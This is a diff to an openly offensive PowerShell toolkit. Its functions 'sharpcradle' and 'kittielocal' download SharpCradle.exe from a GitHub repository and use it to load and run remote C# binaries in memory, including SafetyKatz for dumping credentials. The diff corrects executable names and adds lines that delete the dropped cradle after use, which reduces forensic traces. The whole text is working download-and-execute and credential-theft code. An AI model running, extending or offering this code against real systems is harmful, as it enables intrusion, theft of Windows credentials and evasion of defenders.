@@ -127,7 +127,8 @@ function sharpcradle{
        Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SharpCradle.exe?raw=true -Outfile $currentPath\cradle.exe
        $url = Read-Host -Prompt 'Please Enter an URL to a downloadable C# Binary to run in memory:'
        $arguments = Read-Host -Prompt 'Enter arguments for the executable file:'
-        .\cradlex64.exe -w $url $arguments
+        .\cradle.exe -w $url $arguments
+	del .\cradle.exe
     }
     else
     {
@@ -135,7 +136,8 @@ function sharpcradle{
        Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SharpCradle.exe?raw=true -Outfile $currentPath\cradle.exe
        $url = Read-Host -Prompt 'Please Enter an URL to a downloadable C# Binary to run in memory:'
        $arguments = Read-Host -Prompt 'Enter arguments for the executable file:'
-       .\cradlex86.exe -w $url $arguments
+       .\cradle.exe -w $url $arguments
+       del .\cradle.exe
     }
 }
 
@@ -294,13 +296,15 @@ function kittielocal
                    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 		   Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SharpCradle.exe?raw=true -Outfile $currentPath\cradle.exe
 		   .\cradle.exe -w https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SafetyKatz.exe?raw=true
+		   del .\cradle.exe
                 }
                 else
                 {
                    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 		   Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SharpCradle2.exe?raw=true -Outfile $currentPath\cradle.exe
 		   .\cradle.exe -w https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SafetyKatz.exe?raw=true
-                }
+                   del .\cradle.exe
+		}
             }
             else
             {
